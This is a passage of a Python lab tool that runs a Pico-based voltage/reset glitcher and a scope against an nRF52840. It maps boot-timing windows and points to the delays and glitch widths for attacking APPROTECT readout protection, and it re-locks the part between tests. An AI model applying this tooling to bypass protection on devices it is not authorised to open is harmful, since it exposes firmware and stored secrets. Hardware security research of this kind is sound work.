        print(f"\n>>> BOOT read-timing delay T_marker = {T_marker:.1f} us "
              f"(power-on -> app start ~= just after APPROTECT read)")
        print(f"    This SHOT's glitch fired {glitch_after:.0f} us AFTER the marker "
              f"(delay {a.shot_delay} us). For the attack, sweep delay just BELOW "
              f"{T_marker:.0f} us with width 170-175 cyc.")
        sc.screenshot(f"{OUTDIR}/timing_marker.png")
        try:
            from PIL import Image
            Image.open(f"{OUTDIR}/timing_marker.png").save(f"{OUTDIR}/scope_live.png")
        except Exception:
            pass
        print(f"screenshot -> {OUTDIR}/timing_marker.png")
    finally:
        p.close()


def cmd_resetcrashmap(a):
    """RESET fault-map: localise the sensitive nRST-boot delay window by SURVIVAL.

    SWD can't see most boot faults on a locked part (DPIDR survives), so we use the
    BLINK marker on the scope: per delay, fire a single reset-glitch (TARGET NRF SHOTRST)
    at a STRONG (crash-prone) width and check whether the boot reached app-start (the
    blink resumes on CH2 = SURVIVED) or not (static = CRASHED). The delay band where
    survival DROPS = the glitch is hitting LIVE boot-ROM code = the APPROTECT-read
    neighbourhood -> concentrate the real attack's delay there (at the clean-skip width
    165-175). All-survive at a strong width = the crowbar isn't coupling (see NRF_README).

    Needs the BLINK marker flashed and a LOCKED part. Scope CH1=GP15 (nRST release
    trigger), CH2=marker. Example:
      ./nrf_timing_marker.py --blink --pin 13 --tb 0.000005 --d0 0 --d1 16 --dstep 1 \\
                             --width 300 --reps 15 resetcrashmap
    """
    sc = Scope(a.scope_ip)
    p = Pico(a.pico_port)
    try:
        p.cmd("TARGET NRF52840", 0.4)
        if "APPROTECT=PROTECTED" not in p.cmd("TARGET NRF STATUS", 0.7):
            print("part not locked -> re-locking first (survival map needs the real boot)...")
            relock(p)
        p.cmd("TARGET POWER ON", 0.4); time.sleep(0.3)   # VDD on + booted before the sweep
        sc.lxi(":CHANnel1:DISPlay ON"); sc.lxi(":CHANnel1:COUPling DC")
        sc.lxi(":CHANnel1:SCALe 1.0"); sc.lxi(":CHANnel1:OFFSet -2.0")   # GP15 nRST (trigger)
        sc.lxi(":CHANnel2:DISPlay ON"); sc.lxi(":CHANnel2:COUPling DC")
        sc.lxi(":CHANnel2:SCALe 1.0"); sc.lxi(":CHANnel2:OFFSet -2.0")   # blink marker
        sc.lxi(f":TIMebase:MAIN:SCALe {a.tb}")
        sc.lxi(":TIMebase:MAIN:OFFSet " + str(float(a.tb) * 4))
        sc.lxi(":TRIGger:MODE EDGE"); sc.lxi(":TRIGger:EDGE:SOURce CHANnel1")
        sc.lxi(":TRIGger:EDGE:SLOPe POSitive"); sc.lxi(":TRIGger:EDGE:LEVel 1.5")
        sc.lxi(":TRIGger:SWEep NORMal")
        thr = a.threshold
        print(f"# reset crash-map: delay {a.d0}..{a.d1} step {a.dstep} us, width {a.width} cyc, "
              f"hold {a.hold} us, reps {a.reps}. survival% = boot reached app-start (blink resumed).")
        print("delay_us,survival_pct,n")
        rows = []
        words = build_blink_image(a.port, a.pin, a.k)
        D = a.d0
        while D <= a.d1:
            if a.reflash_each:   # fresh marker per delay so a corrupting shot can't zero later delays
                program_marker(p, words)
                relock(p)
                p.cmd("TARGET POWER ON", 0.3); time.sleep(0.2)
            surv = 0; got = 0
            for _ in range(a.reps):
                sc.lxi(":SINGle"); time.sleep(0.12)
                p.cmd(f"TARGET NRF SHOTRST {D} {a.width} {a.hold}", 0.2)
                end = time.time() + D / 1e6 + 2.0; ok = False
                while time.time() < end:
                    if sc.lxi(":TRIGger:STATus?").startswith(("STOP", "TD")):
                        ok = True; break
                    time.sleep(0.02)
                if not ok:
                    continue
                time.sleep(0.08)
                t1, v1 = sc.wave(1); t2, v2 = sc.wave(2)
                trel = None; pv = None
                for t, v in zip(t1, v1):
                    if pv is not None and pv <= thr < v:
                        trel = t; break
                    pv = v
                if trel is None:
                    trel = t1[0]
                cross = 0; pv = None
                for t, v in zip(t2, v2):
                    if t <= trel:
                        pv = v; continue
                    if pv is not None and ((pv <= thr) != (v <= thr)):
                        cross += 1
                    pv = v
                got += 1
                if cross >= 2:        # blink resumed = boot reached app-start
                    surv += 1
            pct = (100.0 * surv / got) if got else float("nan")
            print(f"{D},{pct:.0f},{got}"); rows.append((D, pct, got))
            D += a.dstep
        valid = [r for r in rows if r[1] == r[1] and r[2] > 0]
        crashy = [r for r in valid if r[1] < 100]
        if crashy:
            dmin = min(crashy, key=lambda r: r[1])
            dfirst = crashy[0][0]
            print(f"\nfirst delay that dents survival = {dfirst} us")
            print(f"most sensitive delay = {dmin[0]} us (survival {dmin[1]:.0f}%) "
                  f"<- glitch hits live boot code here; attack delay ~here, width 165-175 cyc")
        else:
            print("\nno survival drop anywhere -- glitch not coupling at this width, or the "
                  "window is outside the sweep. Re-check crowbar coupling (NRF_README) / widen --d1.")
        # a strong shot can corrupt UICR -> unlock; restore a locked target if so
        if "APPROTECT=PROTECTED" not in p.cmd("TARGET NRF STATUS", 0.7):
            print("note: a strong shot left the part OPEN -- re-locking for further tests.")
            relock(p)
        sc.screenshot(f"{OUTDIR}/reset_crashmap.png")
        print(f"screenshot -> {OUTDIR}/reset_crashmap.png")
    finally:
        p.close()


def cmd_all(a):
    cmd_flash(a)
    print("\n--- now measuring (ensure CH2 is on the marker pin) ---\n")
    cmd_measure(a)


def main():
    p = argparse.ArgumentParser(description=__doc__,
                                formatter_class=ColorHelpFormatter)
    p.add_argument("--pico-port", default=None, help="default: auto-detect")
    p.add_argument("--scope-ip", default=SCOPE_IP_DEFAULT, help="Rigol scope IP (lxi)")
    p.add_argument("--port", type=int, default=0, help="GPIO port (0 or 1)")
    p.add_argument("--pin", type=int, default=6, help="GPIO pin in port (default P0.06=LED LD1)")
    p.add_argument("--low", action="store_true",
                   help="static marker drives the pin LOW instead of HIGH (power-on use)")
    p.add_argument("--blink", action="store_true",
                   help="flash a BLINKING marker (square wave) -- REQUIRED for warm/nRST reset "
                        "timing, where a static pin retains its level across reset")
    p.add_argument("--k", type=int, default=120,
                   help="blink half-period tuning (~k*3 core cyc @64MHz; default 120 ~= 5.6us)")
    p.add_argument("--relock", dest="relock", action="store_true", default=True,
                   help="flash: re-lock the part afterwards (write UICR.APPROTECT + power-cycle) [default]")
    p.add_argument("--no-relock", dest="relock", action="store_false",
                   help="flash: leave the part OPEN (skip re-lock)")
    p.add_argument("--tb", default="0.0002", help="scope timebase s/div (default 200us; "
                   "use ~0.0003 for marktime to fit the pre-trigger marker)")
    p.add_argument("--threshold", type=float, default=1.5, help="marker (CH2) edge threshold, V")
    p.add_argument("--trig-level", dest="trig_level", type=float, default=0.5,
                   help="measure: CH1 VDD trigger/power-on level, V (low = catch ramp start = t0)")
    p.add_argument("--bor-level", dest="bor_level", type=float, default=1.7,
                   help="measure: VDD level taken as BOR/CPU-start (~1.7V for nRF52)")
    p.add_argument("--shot-delay", dest="shot_delay", type=int, default=1500,
                   help="marktime: SHOT delay us (GP2 fiducial); must exceed T_marker")
    p.add_argument("--shot-width", dest="shot_width", type=int, default=30,
                   help="marktime: SHOT width cyc (small = harmless, just need the GP2 edge)")
    sub = p.add_subparsers(dest="cmd", required=True)
    p.add_argument("--d0", type=int, default=0, help="crashmap: delay sweep start, us")
    p.add_argument("--d1", type=int, default=1850, help="crashmap: delay sweep end, us")
    p.add_argument("--dstep", type=int, default=50, help="crashmap: delay step, us")
    p.add_argument("--width", type=int, default=300, help="crashmap: glitch width, cyc (strong=clear crashes)")
    p.add_argument("--reps", type=int, default=3, help="crashmap/resetcrashmap: shots per delay")
    p.add_argument("--hold", type=int, default=200, help="resetcrashmap: nRST low hold, us")
    p.add_argument("--reflash-each", dest="reflash_each", action="store_true",
                   help="resetcrashmap: re-flash the marker before each delay (a strong glitch can "
                        "corrupt flash@0 and that corruption persists, masking later delays)")
    sub.add_parser("verify", help="self-test the marker handler from RAM (no flash/scope)"
                   ).set_defaults(func=cmd_verify)
    sub.add_parser("flash", help="erase + program the marker app to flash (+ re-lock by default)"
                   ).set_defaults(func=cmd_flash)
    sub.add_parser("measure", help="POWER-ON: scope power-on -> marker-edge delay (CH1=VDD)"
                   ).set_defaults(func=cmd_measure)
    sub.add_parser("marktime", help="POWER-ON timing when CH1 is on GP2 (glitch fiducial)"
                   ).set_defaults(func=cmd_marktime)
    sub.add_parser("crashmap", help="localize the sensitive boot window via VDD+marker survival"
                   ).set_defaults(func=cmd_crashmap)
    sub.add_parser("relock", help="re-protect the part (write UICR.APPROTECT + power-cycle)"
                   ).set_defaults(func=cmd_relock)
    sub.add_parser("resetmeasure", help="RESET: scope nRST-release -> app-start (CH1=GP15; use --blink)"
                   ).set_defaults(func=cmd_resetmeasure)
    sub.add_parser("resetcrashmap", help="RESET: fault-map the nRST delay window by boot survival (--blink)"
                   ).set_defaults(func=cmd_resetcrashmap)
    sub.add_parser("all", help="flash then measure (power-on)").set_defaults(func=cmd_all)
    a = p.parse_args()
    a.pico_port = find_pico_port(a.pico_port)
    print(f"[pico] {a.pico_port}")
    try:
        a.func(a)
    except KeyboardInterrupt:
        print("\ninterrupted"); sys.exit(130)


if __name__ == "__main__":
    main()
